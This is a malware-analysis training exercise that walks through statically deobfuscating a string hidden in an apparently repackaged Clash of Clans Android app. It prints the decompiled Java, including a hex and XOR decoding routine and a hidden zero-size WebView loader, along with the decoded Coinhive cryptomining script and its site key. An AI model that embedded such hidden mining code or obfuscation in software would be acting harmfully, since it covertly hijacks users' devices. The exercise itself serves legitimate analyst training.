# Exercise 7 - String Deobfuscation 

## Goals:

To identify obfuscated strings and develop a solution to deobfuscate it.

## Context

You are a malware analyst reviewing this application to determine if it’s malware. You come across an obfuscated Javascript string that is being loaded and need to deobfuscate it to determine whether or not the application is malicious. You can’t run the application dynamically and need to determine what the Javascript is statically.

## Instructions

- [x] Find the string that you need to de-obfuscate
- [x] Identify the routine that de-obfuscates it.
- [x] Determine how you want to write a solution to de-obfuscate the string.
- [x] Do it :)

### Entry points

#### Launcher

```xml
<activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:label="@string/app_name" android:name="com.supercell.clashofclans.GameApp" android:launchMode="singleTask" android:screenOrientation="sensorLandscape" android:configChanges="keyboard|keyboardHidden|navigation|orientation|screenSize" android:windowSoftInputMode="stateUnchanged" android:resizeableActivity="false">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="clashofclans"/>
    </intent-filter>
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="http" android:host="link.clashofclans.com"/>
        <data android:scheme="https" android:host="link.clashofclans.com"/>
    </intent-filter>
</activity>
```

#### Exported

```xml
<receiver android:name="com.google.android.gcm.GCMBroadcastReceiver" android:permission="com.google.android.c2dm.permission.SEND">
    <intent-filter>
        <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
        <action android:name="com.google.android.c2dm.intent.REGISTRATION"/>
        <category android:name="com.supercell.clashofclans"/>
    </intent-filter>
</receiver>

<receiver android:name="com.mobileapptracker.Tracker" android:exported="true">
    <intent-filter>
        <action android:name="com.android.vending.INSTALL_REFERRER"/>
    </intent-filter>
</receiver>

<service android:name="org.OpenUDID.OpenUDID_service">
    <intent-filter>
        <action android:name="org.OpenUDID.GETUDID"/>
    </intent-filter>
</service>
```

### Weird string

```Java
// com/supercell/titan/GameApp.java
private void a(Context context) {
    this.d = new c(context, 8, 8, 8, 8, 0, 0);
    setContentView(this.d);
    ? r8 = 0;
    LinearLayout linearLayout = new LinearLayout(r8);
    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(0, 0);
    WebView webView = new WebView(r8);
    webView.setLayoutParams(layoutParams);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.loadData(z1.b(new String(z1.a("773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"), Charset.forName("UTF-8"))), "text/html", r8);


// com/supercell/titan/z1.java
public class z1 {
    private static final char[] a = "0123456789ABCDEF".toCharArray();

    public static byte[] a(String str) {
        int length = str.length();
        byte[] bArr = new byte[(length / 2)];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    public static String b(String str) {
        char[] cArr = {'K', 'C', 'Q', 'R', '1', '9', 'T', 'Z'};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append((char) (str.charAt(i) ^ cArr[i % cArr.length]));
        }
        return sb.toString();
    }
}
```

### Solution

See [Exercise-7-decode.py](/Exercise-7-decode.py) for the final decoding solution. The string in question appears to create a web view that uses your phone for Crypto Currency mining.

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
